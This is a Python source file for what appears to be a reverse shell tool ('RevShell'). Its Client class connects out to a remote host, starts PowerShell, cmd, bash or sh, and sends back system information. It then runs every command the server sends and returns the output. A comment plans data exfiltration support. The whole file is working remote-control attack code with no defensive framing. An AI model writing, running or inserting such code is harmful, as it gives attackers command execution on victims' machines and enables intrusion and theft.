# todo: create handling for data exfiltration
from .nodeutils import (
    os,
    shutil,
    Path,
    subprocess,
    struct,
    sys,
    socket,
    StreamSocket,
    utils
)


class Client(StreamSocket):
    """TCP socket client class for the command shell"""
    def __init__(self, rhost: str, port: int, verb: bool, debug: bool):
        super().__init__(rhost, port, verb, debug)
        self.Shell = None

    def spawn_shell(self, op_sys: str = os.name) -> subprocess.Popen:
        """Spawn new command shell process to be used for code execution"""
        environment = os.environ.copy()

        if op_sys == "nt":
            shell_exec = shutil.which("powershell.exe")
            if shell_exec is None:
                shell_exec = shutil.which("cmd.exe")
        else:
            shell_exec = shutil.which("bash")
            if shell_exec is None:
                shell_exec = shutil.which("sh")

        # Popen expects [str] for non-shell calls
        shell = subprocess.Popen(
            [], shell=True,
            executable=shell_exec,
            env=environment,
            cwd=str(Path.home()),
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            encoding="utf-8"
        )

        if self.Verbose:
            utils.status(f"{shell_exec}")

        self.Shell = shell
        return self.Shell

    def connect(self) -> None:
        """Initiate connection to remote server shell"""
        sock = socket.socket()
        #sock.settimeout(60)

        executable = self.get_executable()

        try:
            sock.connect((self.Address, self.Port))
        except socket.timeout:
            utils.throw(f"Connection with {self.Address}, timed out.")
        except:
            utils.throw(f"Could not establish connection with {self.Address}")

        try:
            establish_msg = self.receive(sock).decode()
            utils.status(establish_msg)

            sysinfo = self.sys_info()
            self.send(sock, sysinfo)

            # TODO: fix issue => exception is thrown when running outside of pycharm

            while True:
                command = self.receive(sock).decode()

                if command.lower() not in ["exit", "quit"]:
                    stdout, stderr = self.execute(command, executable)

                    if stdout != b"":
                        output = stdout
                        level = "output"
                    else:
                        output = stderr
                        level = "error"

                    if self.Debug:
                        utils.status(bytes(output).decode(), level, command)
                    elif self.Verbose:
                        utils.status(f"stdin => [{command}]", level)

                    self.send(sock, output)
                else:
                    if self.Verbose:
                        utils.status("stdin => [exit]", "output")
                        utils.status("Exiting RevShell.")
                    break
        except Exception as exc:
            self.except_handler(exc)
        finally:
            if self.Shell is not None:
                if self.Verbose:
                    utils.status(f"Killing shell process {self.Shell.pid}")
                self.Shell.kill()

            try:
                sock.shutdown(socket.SHUT_WR)
            except OSError:
                pass
            finally:
                sock.close()
